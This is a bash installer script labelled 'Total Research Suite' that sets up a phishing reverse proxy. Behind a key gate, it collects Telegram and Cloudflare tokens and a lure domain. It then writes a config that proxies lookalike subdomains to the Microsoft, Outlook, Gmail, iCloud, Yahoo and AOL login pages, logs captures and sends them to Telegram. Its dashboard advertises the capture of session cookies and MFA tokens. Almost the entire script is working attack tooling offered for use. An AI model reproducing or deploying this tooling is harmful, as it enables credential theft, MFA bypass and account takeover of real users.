#!/bin/bash
# 🏛️ TROJANPAGE - TOTAL RESEARCH SUITE (V8.0)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${CYAN}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
    echo -e "                  ${PURPLE}[ INTERNAL SECURITY RESEARCH TERMINAL ]${NC}"
}

# --- 1. PRE-FLIGHT ---
VPS_IP=$(curl -s https://api.ipify.org)
MASTER_KEY="TROJAN-PRO-2026"
show_header
read -p "ENTER SYSTEM KEY: " USER_INPUT
[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && exit 1

# --- 2. SETTINGS ---
read -p "Enter Telegram Bot Token: " TG_TOKEN
read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter Cloudflare API Token: " CF_TOKEN
read -p "Enter Base Domain (e.g. motarmo.click): " USER_DOMAIN
USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')

# --- 3. THE "FANCY" DASHBOARD GENERATION ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}RESEARCH DASHBOARD${NC} | ${PURPLE}DOMAIN:${NC} $DOMAIN | ${GREEN}STATUS: ACTIVE${NC}  ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} ${CYAN}ID${NC} | ${CYAN}SITE${NC}       | ${CYAN}TARGET HOST${NC}              | ${CYAN}MITM STATUS${NC}   ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | login.microsoftonline.com | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | outlook.live.com          | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | accounts.google.com       | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | www.icloud.com            | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | login.yahoo.com           | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | login.aol.com             | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${PURPLE}»» CAPTURING REAL-TIME SESSION COOKIES & MFA TOKENS...${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config "$CONFIG"
EOF

# --- 4. CONFIG GENERATION (ALL TARGETS) ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Total Research Suite Deployed. Type 'Run' to begin.${NC}"
